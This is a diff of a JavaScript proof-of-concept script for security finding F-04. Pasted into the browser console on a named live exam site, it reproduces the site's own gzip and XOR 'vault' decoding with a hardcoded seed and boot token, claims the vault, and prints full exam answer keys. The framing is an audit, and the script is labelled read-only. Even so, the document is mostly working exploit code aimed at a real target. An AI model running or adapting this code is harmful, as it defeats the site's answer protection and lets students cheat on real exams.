@@ -1,135 +1,118 @@
 // poc_f04_exam_answers.js — F-04: Exam answer exposure (DISPLAY-ONLY, read-only)
 //
 // Target:  https://trithuc500.vercel.app/
-// Finding:  F-04 — correct answers ship in the public bundle (both plaintext
-//           `correctAnswers` and XOR-obfuscated `ENC_PAYLOAD`).
-// Type:     DISPLAY ONLY. Reads the live DOM/global dataset and prints answers.
+// Finding: F-04 — correct answers ship in the client bundle. V4.5 moved them
+//           into a gzip + PRNG-XOR "vault", but the chunk seed and the vault
+//           boot token are still literals in the delivered JavaScript.
+// Type:     DISPLAY ONLY. Reads DOM/global data and decrypts locally.
 //           Does NOT modify state, does NOT contact ntfy/KV, does NOT submit.
 //
 // Usage: paste into DevTools Console on the target page.
-// Output: a per-exam answer key table.
+// Output: exam count, answer count and one answer key.
 
-(() => {
+(async () => {
     'use strict';
 
-    // ---- 1. Decrypt the XOR-wrapped payload exactly as the app does. -------
-    // Source: decryptV97EmbedPayload() — key = "TRUNG_SEC_2026_" + sig
-    function decryptV97EmbedPayload(encB64, sig) {
-        try {
-            const rawBin = atob(encB64);
-            const bytes = new Uint8Array(rawBin.length);
-            for (let i = 0; i < rawBin.length; i++) bytes[i] = rawBin.charCodeAt(i);
-            const keyStr = "TRUNG_SEC_2026_" + String(sig || '').trim();
-            const outBytes = new Uint8Array(bytes.length);
-            for (let i = 0; i < bytes.length; i++) {
-                const k = keyStr.charCodeAt(i % keyStr.length);
-                outBytes[i] = ((bytes[i] ^ k) - ((i * 7) % 256) + 256) % 256;
+    const BOOT_TOKEN = 'TT50_V45_INTERNAL_BOOT_SEAL'; // bundle literal
+    const EXAM_SEED = 0x4F81E3A7;                     // shipped __decGzChunks seed
+
+    // ---- 1. Reproduce the shipped PRNG-XOR chunk decoder locally. ---------
+    function makeDecoder(seed) {
+        return async function decodeGzChunks(chunks) {
+            if (!Array.isArray(chunks) || !chunks.length) return '{}';
+            if (typeof DecompressionStream === 'undefined' || typeof Response === 'undefined') {
+                throw new Error('DecompressionStream unavailable in this context');
             }
-            const utf8Str = new TextDecoder('utf-8').decode(outBytes);
-            return JSON.parse(utf8Str);
-        } catch (e) {
-            try {
-                const rawBin = atob(encB64);
-                const bytes = new Uint8Array(rawBin.length);
-                for (let i = 0; i < rawBin.length; i++) bytes[i] = rawBin.charCodeAt(i);
-                const utf8Str = new TextDecoder('utf-8').decode(bytes);
-                return JSON.parse(decodeURIComponent(escape(utf8Str)));
-            } catch (e2) {
-                return null;
+            const parts = [];
+            for (let ci = 0; ci < chunks.length; ci++) {
+                const bin = atob(chunks[ci]);
+                const buf = new Uint8Array(bin.length);
+                let s = ((seed ^ Math.imul(ci + 1, 0x9E3779B1)) >>> 0) || 0x9E3779B9;
+                const ks = new Uint8Array(4096);
+                for (let k = 0; k < 4096; k++) {
+                    s ^= (s << 13) >>> 0;
+                    s ^= (s >>> 17);
+                    s ^= (s << 5) >>> 0;
+                    ks[k] = (s ^ ((k * 31) & 0xFF)) & 0xFF;
+                }
+                for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i) ^ ks[i & 4095];
+                parts.push(buf);
             }
-        }
+            const res = new Response(new Blob(parts).stream().pipeThrough(new DecompressionStream('gzip')));
+            return await res.text();
+        };
     }
 
-    // ---- 2. Collect exam records from every source the page exposes. ------
-    const exams = [];
+    const decodeGzChunks = makeDecoder(EXAM_SEED);
+    const recovered = [];
 
-    // 2a. window.__INITIAL_EXAMS_DATA__ — the primary dataset.
+    // ---- 2a. Preferred V4.5 path: claim the vault with the literal token. --
     try {
-        const raw = window.__INITIAL_EXAMS_DATA__;
-        if (Array.isArray(raw)) {
-            raw.forEach(e => {
-                if (!e) return;
-                const ca = e.correctAnswers || e.answers || null;
-                exams.push({
-                    source: '__INITIAL_EXAMS_DATA__',
-                    id: e.id || '',
-                    title: e.title || e.name || '',
-                    hasPlainAnswers: !!ca,
-                    answers: ca,
-                    encPayload: e.ENC_PAYLOAD || e.encPayload || null,
-                    sig: e.sig || e.signature || ''
-                });
-            });
+        if (typeof window.__TT50_CLAIM_VAULT_V45__ === 'function') {
+            const vault = window.__TT50_CLAIM_VAULT_V45__(BOOT_TOKEN);
+            if (vault && Array.isArray(vault.initialExams) && vault.initialExams.length) {
+                vault.initialExams.forEach(e => recovered.push({ source: 'vault claim', e }));
+            }
         }
+    } catch (e) { /* already claimed or unavailable — fall through to the blob */ }
+
+    // ---- 2b. Decode the gzip vault blob directly from the shipped script. -
+    if (!recovered.length) {
+        try {
+            const scripts = Array.from(document.querySelectorAll('script')).map(s => s.textContent || '');
+            const blobScript = scripts.find(t => t.includes('var __ENC_GZ = '));
+            if (blobScript) {
+                const from = blobScript.indexOf('var __ENC_GZ = ') + 'var __ENC_GZ = '.length;
+                const to = blobScript.indexOf(';', from);
+                const enc = JSON.parse(blobScript.slice(from, to));
+                if (Array.isArray(enc.exams) && enc.exams.length) {
+                    const exams = JSON.parse(await decodeGzChunks(enc.exams));
+                    exams.forEach(e => recovered.push({ source: 'gzip vault', e }));
+                }
+            }
+        } catch (e) { console.warn('[F-04] gzip vault decode failed:', e && e.message); }
+    }
+
+    // ---- 2c. Legacy fallbacks (older builds kept plaintext / XOR payloads). -
+    try {
+        const legacy = window.__INITIAL_EXAMS_DATA__;
+        if (Array.isArray(legacy)) legacy.forEach(e => recovered.push({ source: '__INITIAL_EXAMS_DATA__', e }));
     } catch (e) { /* ignore */ }
 
-    // 2b. DOM-embedded exam scripts (the per-lesson V4.3 payload blocks).
-    const blocks = Array.from(document.querySelectorAll('script'))
-        .map(s => s.textContent || '')
-        .filter(t => t.includes('correctAnswers') || t.includes('ENC_PAYLOAD'));
+    // ---- 3. Report --------------------------------------------------------
+    function answerCount(e) {
+        const ca = e && (e.correctAnswers || e.answers);
+        if (!ca || typeof ca !== 'object') return 0;
+        return ['p1', 'p2', 'p3', 'p4'].reduce((n, p) => n + Object.keys(ca[p] || {}).length, 0);
+    }
 
-    const domAnswers = [];
-    blocks.forEach(text => {
-        // plaintext correctAnswers JSON
-        const mCa = text.match(/"correctAnswers"\s*:\s*(\{[\s\S]*?\})\s*,\s*"/);
-        if (mCa) {
-            try {
-                domAnswers.push({ source: 'DOM script', kind: 'plain', answers: JSON.parse(mCa[1]) });
-            } catch (e) { /* ignore */ }
-        }
-        // XOR payload
-        const mEnc = text.match(/const\s+ENC_PAYLOAD\s*=\s*"([^"]+)"/);
-        const mSig = text.match(/const\s+ENC_SIG\s*=\s*"?([^";\n]+)"?/);
-        if (mEnc && mEnc[1] && mEnc[1] !== '{{ENC_PAYLOAD}}') {
-            const dec = decryptV97EmbedPayload(mEnc[1], mSig ? mSig[1] : '');
-            if (dec) domAnswers.push({ source: 'DOM script', kind: 'xor', answers: dec });
-        }
+    let total = 0;
+    const rows = recovered.map(r => {
+        const n = answerCount(r.e);
+        total += n;
+        return {
+            exam: String((r.e && (r.e.title || r.e.id)) || '').slice(0, 42),
+            answers: n,
+            source: r.source
+        };
     });
 
-    // ---- 3. Report ---------------------------------------------------------
-    const plainCount = exams.filter(e => e.hasPlainAnswers).length;
     console.log('=== F-04 Exam answer exposure (READ-ONLY) ===');
-    console.log(`exams in __INITIAL_EXAMS_DATA__: ${exams.length}`);
-    console.log(`exams with PLAINTEXT correctAnswers: ${plainCount}`);
-    console.log(`DOM script blocks with answer data: ${blocks.length}`);
-    console.log(`answer payloads recovered from DOM: ${domAnswers.length}`);
-
-    if (plainCount > 0 || domAnswers.length > 0) {
-        console.warn('[F-04] CONFIRMED: correct answers are present in client-shipped data.');
-    }
-
-    // Show a readable answer key for every exam that has one.
-    const rows = [];
-    exams.filter(e => e.hasPlainAnswers).forEach(e => {
-        const ca = e.answers || {};
-        rows.push({
-            exam: (e.title || e.id).slice(0, 42),
-            p1: Object.keys(ca.p1 || {}).length,
-            p2: Object.keys(ca.p2 || {}).length,
-            p3: Object.keys(ca.p3 || {}).length,
-            source: e.source
-        });
-    });
+    console.log(`exams recovered: ${recovered.length}`);
+    console.log(`correct-answer entries: ${total}`);
     if (rows.length) console.table(rows);
+    if (total > 0) console.warn('[F-04] CONFIRMED: correct answers are readable client-side before submission.');
 
-    // Full answer key dump for the first exam that has one.
-    const first = exams.find(e => e.hasPlainAnswers);
+    const first = recovered.find(r => answerCount(r.e) > 0);
     if (first) {
-        console.log(`\n--- Full answer key: ${first.title || first.id} ---`);
-        console.log(JSON.stringify(first.answers, null, 1));
+        console.log(`\n--- Full answer key: ${first.e.title || first.e.id} ---`);
+        console.log(JSON.stringify(first.e.correctAnswers || first.e.answers, null, 1));
     }
-
-    domAnswers.slice(0, 3).forEach((d, i) => {
-        console.log(`\n--- DOM answer payload #${i + 1} (${d.kind}) ---`);
-        console.log(JSON.stringify(d.answers).slice(0, 1200));
-    });
 
     return {
-        exams: exams.length,
-        examsWithPlainAnswers: plainCount,
-        domBlocks: blocks.length,
-        domPayloads: domAnswers.length,
-        verdict: (plainCount > 0 || domAnswers.length > 0) ? 'F-04 CONFIRMED (read-only)' : 'not observed',
+        exams: recovered.length,
+        answers: total,
+        verdict: total > 0 ? 'F-04 CONFIRMED (read-only)' : 'not observed',
         impact: 'Answers are client-side. Grading is client-side. A student can read the key before submitting.'
     };
 })();
